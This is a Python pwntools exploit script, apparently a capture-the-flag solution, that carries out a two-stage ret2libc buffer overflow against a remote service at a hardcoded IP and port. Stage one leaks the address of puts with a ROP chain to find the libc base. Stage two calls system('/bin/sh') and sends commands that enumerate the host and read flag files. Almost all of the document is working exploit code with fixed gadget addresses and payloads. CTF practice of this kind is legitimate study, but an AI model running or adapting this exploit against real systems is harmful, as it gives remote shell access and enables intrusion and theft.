#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ret2libc —— 泄露 puts 地址 -> 算 libc base -> system("/bin/sh")

附件: attachments/pwn（amd64，**无 PIE**，Partial RELRO、NX、无 canary，未 strip）
      attachments/libc.so.6（puts=0x8e860，system=0x5c2e0，"/bin/sh"=0x1db799）

静态标定（与手搓 p2.py 完全一致）:
  vuln       = 0x40116f        # push rbp; mov rbp,rsp; sub rsp,0x40  -> 0x40+8 = 72 到 saved RIP
  pop_rdi    = 0x40116a        # 5f c3
  ret        = 0x40101a        # c3（system 前修 16 字节对齐）
  puts@plt   = 0x401030        # 本机 pwntools 缺 unicorn 无法自动填 e.plt，按 .plt 手算
  puts@got   = 0x404000

两阶段:
  1) 72 + pop_rdi + puts@got + puts@plt + vuln   -> 回显 puts 真实地址
  2) 72 + pop_rdi + /bin/sh + ret + system       -> shell

用法:
  python exp.py                 # 默认 219.216.64.241:35194
  python exp.py HOST PORT
"""
import re
import sys
import time

from pwn import ELF, context, flat, p64, remote, u64

HOST, PORT = "219.216.64.241", 35194
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])

VULN = 0x40116F
POP_RDI = 0x40116A
RET = 0x40101A
PUTS_PLT = 0x401030
PUTS_GOT = 0x404000
OFFSET = 72

FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")
context.arch = "amd64"
context.log_level = "error"

LIBC = ELF("attachments/libc.so.6", checksec=False)


def main():
    p = remote(HOST, PORT)
    p.recvuntil(b"> ", timeout=5)

    stage1 = flat(b"A" * OFFSET, p64(POP_RDI), p64(PUTS_GOT), p64(PUTS_PLT), p64(VULN))
    p.sendline(stage1)

    leak = p.recvline(timeout=5).rstrip(b"\n")
    puts_addr = u64(leak.ljust(8, b"\x00")[:8])
    base = puts_addr - LIBC.symbols["puts"]
    system = base + LIBC.symbols["system"]
    binsh = base + next(LIBC.search(b"/bin/sh\x00"))
    print("[*] leak puts = %#x" % puts_addr)
    print("[*] libc base = %#x" % base)
    print("[*] system    = %#x" % system)
    print("[*] /bin/sh   = %#x" % binsh)

    # 注意：第二次进入 vuln 不会再打印 "> "，别 recvuntil，直接发 stage2
    stage2 = flat(b"A" * OFFSET, p64(POP_RDI), p64(binsh), p64(RET), p64(system))
    p.sendline(stage2)

    time.sleep(0.3)
    p.sendline(
        b"echo PWNED; id; pwd; ls -la; cat ./flag 2>/dev/null; cat flag* 2>/dev/null; "
        b"cat /flag 2>/dev/null; find / -maxdepth 3 -name '*flag*' -type f 2>/dev/null | head"
    )
    out = p.recvrepeat(6).decode("utf-8", "replace")
    print("[*] shell output:\n" + out.strip()[:2000])

    m = FLAG_RE.search(out)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[-] 未取到 flag（检查 libc 版本/偏移）")
    p.close()
    return 0 if m else 1


if __name__ == "__main__":
    sys.exit(main())
